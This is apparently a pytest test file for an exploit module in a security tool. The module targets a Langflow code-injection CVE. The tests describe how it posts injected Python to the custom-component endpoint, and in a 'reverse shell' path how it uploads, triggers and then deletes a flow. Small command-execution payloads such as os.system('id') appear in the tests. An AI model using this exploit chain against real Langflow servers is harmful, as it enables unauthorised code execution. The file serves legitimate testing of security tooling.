"""Tests for flowhound.vulnerabilities.exploits.langflow.cve_2026_0769."""

from unittest.mock import MagicMock, patch

from hypothesis import given, settings
from hypothesis import strategies as st

from flowhound.vulnerabilities.exploits.langflow.cve_2026_0769 import Exploit

_BASE_URL = "http://localhost:7860"
_AUTH_HEADERS = {
    "Authorization": "Bearer test-token",
    "Content-Type": "application/json",
}


def _mock_resp(status: int = 200, json_data=None, text: str = "ok"):
    resp = MagicMock()
    resp.status_code = status
    resp.text = text
    if json_data is not None:
        resp.json.return_value = json_data
    return resp


# ---------------------------------------------------------------------------
# _blocking_boilerplate (static)
# ---------------------------------------------------------------------------


class TestBlockingBoilerplate:
    def test_indents_code(self):
        result = Exploit._blocking_boilerplate("x = 1\ny = 2")
        assert "        x = 1" in result
        assert "        y = 2" in result

    def test_single_line_indented(self):
        assert "        x = 1" in Exploit._blocking_boilerplate("x = 1")

    def test_contains_component_class(self):
        result = Exploit._blocking_boilerplate("x = 1")
        assert "PwnComponent" in result
        assert "CVE-2026-0769-Probe" in result

    def test_contains_run_method(self):
        result = Exploit._blocking_boilerplate("x = 1")
        assert "def run(self)" in result

    def test_empty_code_produces_valid_class(self):
        result = Exploit._blocking_boilerplate("")
        assert "PwnComponent" in result
        assert "payload executed" in result

    def test_multiline_all_lines_indented(self):
        code = "a = 1\nb = 2\nc = 3"
        result = Exploit._blocking_boilerplate(code)
        lines = result.splitlines()
        indented = [
            ln
            for ln in lines
            if ln.startswith(("        a = ", "        b = ", "        c = "))
        ]
        assert len(indented) == 3


# ---------------------------------------------------------------------------
# _blocking_boilerplate — hypothesis property tests
# ---------------------------------------------------------------------------


@given(st.text())
@settings(max_examples=300)
def test_blocking_boilerplate_never_raises_for_arbitrary_code(code):
    """_blocking_boilerplate must never raise for any string input."""
    result = Exploit._blocking_boilerplate(code)
    assert isinstance(result, str)


@given(st.text())
@settings(max_examples=300)
def test_blocking_boilerplate_always_contains_component_class(code):
    """The component class skeleton must always be present regardless of input."""
    result = Exploit._blocking_boilerplate(code)
    assert "class PwnComponent" in result
    assert "def run(self)" in result


@given(st.text(alphabet=st.characters(blacklist_categories=("Cs",)), min_size=1))
@settings(max_examples=300)
def test_blocking_boilerplate_every_line_indented(code):
    """Every line of the injected code must be indented by exactly 8 spaces inside run()."""
    result = Exploit._blocking_boilerplate(code)
    # Collect lines between 'def run' and the final return statement
    lines = result.splitlines()
    run_idx = next(i for i, ln in enumerate(lines) if "def run(self)" in ln)
    return_idx = next(i for i, ln in enumerate(lines) if "return Data(data=" in ln)
    injected_lines = [ln for ln in lines[run_idx + 1 : return_idx] if ln.strip()]
    for ln in injected_lines:
        assert ln.startswith("        "), f"Line not indented by 8 spaces: {ln!r}"


# ---------------------------------------------------------------------------
# trigger_vuln
# ---------------------------------------------------------------------------


class TestTriggerVuln:
    def test_sends_to_custom_component_endpoint(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
            return_value=_mock_resp(200),
        ) as mock_post:
            exploit.trigger_vuln(base_url=_BASE_URL, auth=_AUTH_HEADERS, code="x = 1")
        assert mock_post.call_args.args[0] == _BASE_URL + "/api/v1/custom_component"

    def test_body_contains_code_and_frontend_node(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
            return_value=_mock_resp(200),
        ) as mock_post:
            exploit.trigger_vuln(base_url=_BASE_URL, auth=_AUTH_HEADERS, code="x = 1")
        body = mock_post.call_args.kwargs["json"]
        assert "code" in body
        assert body["frontend_node"] == {}

    def test_body_appends_component_boilerplate(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
            return_value=_mock_resp(200),
        ) as mock_post:
            exploit.trigger_vuln(base_url=_BASE_URL, auth=_AUTH_HEADERS, code="x = 1")
        body_code = mock_post.call_args.kwargs["json"]["code"]
        assert "x = 1" in body_code
        assert "PwnComponent" in body_code

    def test_sends_content_type_header(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
            return_value=_mock_resp(200),
        ) as mock_post:
            exploit.trigger_vuln(base_url=_BASE_URL, auth=_AUTH_HEADERS, code="x = 1")
        assert (
            mock_post.call_args.kwargs["headers"]["Content-Type"] == "application/json"
        )

    def test_auth_header_forwarded(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
            return_value=_mock_resp(200),
        ) as mock_post:
            exploit.trigger_vuln(base_url=_BASE_URL, auth=_AUTH_HEADERS, code="x = 1")
        assert "Authorization" in mock_post.call_args.kwargs["headers"]

    def test_network_error_returns_none(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
            side_effect=OSError("refused"),
        ):
            assert (
                exploit.trigger_vuln(
                    base_url=_BASE_URL, auth=_AUTH_HEADERS, code="x = 1"
                )
                is None
            )

    def test_passes_proxies(self):
        proxies = {"http": "http://127.0.0.1:8080"}
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
            return_value=_mock_resp(200),
        ) as mock_post:
            exploit.trigger_vuln(
                base_url=_BASE_URL,
                auth=_AUTH_HEADERS,
                code="x = 1",
                proxies=proxies,
            )
        assert mock_post.call_args.kwargs["proxies"] == proxies


# ---------------------------------------------------------------------------
# _upload_flow
# ---------------------------------------------------------------------------


class TestUploadFlow:
    def test_sends_to_flows_endpoint(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
            return_value=_mock_resp(201, {"id": "abc123"}),
        ) as mock_post:
            exploit._upload_flow(
                base_url=_BASE_URL, auth=_AUTH_HEADERS, component_code="code"
            )
        assert mock_post.call_args.args[0] == _BASE_URL + "/api/v1/flows/"

    def test_returns_flow_id_on_201(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
            return_value=_mock_resp(201, {"id": "flow-abc"}),
        ):
            result = exploit._upload_flow(
                base_url=_BASE_URL, auth=_AUTH_HEADERS, component_code="code"
            )
        assert result == "flow-abc"

    def test_returns_flow_id_on_200(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
            return_value=_mock_resp(200, {"id": "flow-xyz"}),
        ):
            result = exploit._upload_flow(
                base_url=_BASE_URL, auth=_AUTH_HEADERS, component_code="code"
            )
        assert result == "flow-xyz"

    def test_returns_none_on_non_200(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
            return_value=_mock_resp(403, {"detail": "forbidden"}),
        ):
            assert (
                exploit._upload_flow(
                    base_url=_BASE_URL, auth=_AUTH_HEADERS, component_code="code"
                )
                is None
            )

    def test_returns_none_on_network_error(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
            side_effect=OSError("refused"),
        ):
            assert (
                exploit._upload_flow(
                    base_url=_BASE_URL, auth=_AUTH_HEADERS, component_code="code"
                )
                is None
            )

    def test_component_code_embedded_in_body(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
            return_value=_mock_resp(201, {"id": "x"}),
        ) as mock_post:
            exploit._upload_flow(
                base_url=_BASE_URL,
                auth=_AUTH_HEADERS,
                component_code="my_payload_code",
            )
        flow = mock_post.call_args.kwargs["json"]
        node = flow["data"]["nodes"][0]
        code_value = node["data"]["node"]["template"]["code"]["value"]
        assert "my_payload_code" in code_value


# ---------------------------------------------------------------------------
# _trigger_flow
# ---------------------------------------------------------------------------


class TestTriggerFlow:
    def test_sends_to_build_endpoint(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
            return_value=_mock_resp(200),
        ) as mock_post:
            exploit._trigger_flow(
                base_url=_BASE_URL, auth=_AUTH_HEADERS, flow_id="flow-123"
            )
        assert mock_post.call_args.args[0] == _BASE_URL + "/api/v1/build/flow-123/flow"

    def test_uses_short_read_timeout(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
            return_value=_mock_resp(200),
        ) as mock_post:
            exploit._trigger_flow(
                base_url=_BASE_URL, auth=_AUTH_HEADERS, flow_id="flow-123"
            )
        timeout = mock_post.call_args.kwargs["timeout"]
        assert isinstance(timeout, tuple)
        assert timeout[1] <= 5

    def test_network_error_does_not_raise(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
            side_effect=OSError("timed out"),
        ):
            exploit._trigger_flow(
                base_url=_BASE_URL, auth=_AUTH_HEADERS, flow_id="flow-123"
            )  # must not raise


# ---------------------------------------------------------------------------
# _delete_flow
# ---------------------------------------------------------------------------


class TestDeleteFlow:
    def test_sends_delete_to_flows_endpoint(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.delete",
            return_value=_mock_resp(204),
        ) as mock_delete:
            exploit._delete_flow(
                base_url=_BASE_URL, auth=_AUTH_HEADERS, flow_id="flow-abc"
            )
        assert mock_delete.call_args.args[0] == _BASE_URL + "/api/v1/flows/flow-abc"

    def test_network_error_does_not_raise(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.delete",
            side_effect=OSError("refused"),
        ):
            exploit._delete_flow(
                base_url=_BASE_URL, auth=_AUTH_HEADERS, flow_id="flow-abc"
            )  # must not raise


# ---------------------------------------------------------------------------
# exploit — non-blocking path
# ---------------------------------------------------------------------------


class TestExploitNonBlocking:
    def test_returns_true_on_200(self):
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADERS),
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
                return_value=_mock_resp(200, {"result": "ok"}),
            ),
        ):
            assert exploit.exploit(base_url=_BASE_URL, username="", password="") is True

    def test_returns_false_on_non_200(self):
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADERS),
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
                return_value=_mock_resp(400, {"detail": "bad request"}),
            ),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="", password="") is False
            )

    def test_returns_false_when_auth_fails(self):
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=None),
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post"
            ) as mock_post,
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="", password="") is False
            )
        mock_post.assert_not_called()

    def test_returns_false_on_network_error(self):
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADERS),
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
                side_effect=OSError("refused"),
            ),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="", password="") is False
            )

    def test_uses_default_code_when_no_payload(self):
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADERS),
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
                return_value=_mock_resp(200),
            ) as mock_post,
        ):
            exploit.exploit(base_url=_BASE_URL, username="", password="")
        body_code = mock_post.call_args.kwargs["json"]["code"]
        assert "check_output" in body_code

    def test_uses_payload_code(self):
        payload = MagicMock()
        payload.load_payload.return_value = "import os\nos.system('id')"
        payload.blocking = False
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADERS),
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
                return_value=_mock_resp(200),
            ) as mock_post,
        ):
            exploit.exploit(
                base_url=_BASE_URL, username="", password="", payload=payload
            )
        body_code = mock_post.call_args.kwargs["json"]["code"]
        assert "os.system('id')" in body_code

    def test_does_not_call_upload_or_build_for_non_blocking(self):
        payload = MagicMock()
        payload.load_payload.return_value = "x = 1"
        payload.blocking = False
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADERS),
            patch.object(exploit, "_upload_flow") as mock_upload,
            patch.object(exploit, "_trigger_flow") as mock_trigger,
            patch(
                "flowhound.vulnerabilities.exploits.langflow.cve_2026_0769.post",
                return_value=_mock_resp(200),
            ),
        ):
            exploit.exploit(
                base_url=_BASE_URL, username="", password="", payload=payload
            )
        mock_upload.assert_not_called()
        mock_trigger.assert_not_called()


# ---------------------------------------------------------------------------
# exploit — blocking path (reverse shell)
# ---------------------------------------------------------------------------


class TestExploitBlocking:
    def test_blocking_payload_uploads_and_triggers_flow(self):
        payload = MagicMock()
        payload.load_payload.return_value = "import socket"
        payload.blocking = True
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADERS),
            patch.object(
                exploit, "_upload_flow", return_value="flow-abc"
            ) as mock_upload,
            patch.object(exploit, "_trigger_flow") as mock_trigger,
            patch.object(exploit, "_delete_flow") as mock_delete,
        ):
            result = exploit.exploit(
                base_url=_BASE_URL, username="", password="", payload=payload
            )
        assert result is True
        mock_upload.assert_called_once()
        mock_trigger.assert_called_once()
        mock_delete.assert_called_once()

    def test_blocking_payload_code_wrapped_in_run(self):
        payload = MagicMock()
        payload.load_payload.return_value = "import socket\ns = socket.socket()"
        payload.blocking = True
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADERS),
            patch.object(
                exploit, "_upload_flow", return_value="flow-abc"
            ) as mock_upload,
            patch.object(exploit, "_trigger_flow"),
            patch.object(exploit, "_delete_flow"),
        ):
            exploit.exploit(
                base_url=_BASE_URL, username="", password="", payload=payload
            )
        uploaded_code = mock_upload.call_args.kwargs["component_code"]
        # Payload lines must be indented inside run()
        assert "        import socket" in uploaded_code
        assert "        s = socket.socket()" in uploaded_code

    def test_blocking_returns_false_when_upload_fails(self):
        payload = MagicMock()
        payload.load_payload.return_value = "x = 1"
        payload.blocking = True
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADERS),
            patch.object(exploit, "_upload_flow", return_value=None),
            patch.object(exploit, "_trigger_flow") as mock_trigger,
        ):
            result = exploit.exploit(
                base_url=_BASE_URL, username="", password="", payload=payload
            )
        assert result is False
        mock_trigger.assert_not_called()

    def test_blocking_does_not_call_trigger_vuln(self):
        payload = MagicMock()
        payload.load_payload.return_value = "x = 1"
        payload.blocking = True
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADERS),
            patch.object(exploit, "_upload_flow", return_value="flow-abc"),
            patch.object(exploit, "_trigger_flow"),
            patch.object(exploit, "_delete_flow"),
            patch.object(exploit, "trigger_vuln") as mock_trigger_vuln,
        ):
            exploit.exploit(
                base_url=_BASE_URL, username="", password="", payload=payload
            )
        mock_trigger_vuln.assert_not_called()

    def test_blocking_deletes_flow_after_trigger(self):
        payload = MagicMock()
        payload.load_payload.return_value = "x = 1"
        payload.blocking = True
        exploit = Exploit()
        call_order = []
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADERS),
            patch.object(exploit, "_upload_flow", return_value="flow-abc"),
            patch.object(
                exploit,
                "_trigger_flow",
                side_effect=lambda **_: call_order.append("trigger"),
            ),
            patch.object(
                exploit,
                "_delete_flow",
                side_effect=lambda **_: call_order.append("delete"),
            ),
        ):
            exploit.exploit(
                base_url=_BASE_URL, username="", password="", payload=payload
            )
        assert call_order == ["trigger", "delete"]

    def test_upload_flow_receives_correct_flow_id_for_trigger_and_delete(self):
        payload = MagicMock()
        payload.load_payload.return_value = "x = 1"
        payload.blocking = True
        exploit = Exploit()
        with (
            patch.object(exploit, "handle_authentication", return_value=_AUTH_HEADERS),
            patch.object(exploit, "_upload_flow", return_value="flow-xyz"),
            patch.object(exploit, "_trigger_flow") as mock_trigger,
            patch.object(exploit, "_delete_flow") as mock_delete,
        ):
            exploit.exploit(
                base_url=_BASE_URL, username="", password="", payload=payload
            )
        assert mock_trigger.call_args.kwargs["flow_id"] == "flow-xyz"
        assert mock_delete.call_args.kwargs["flow_id"] == "flow-xyz"
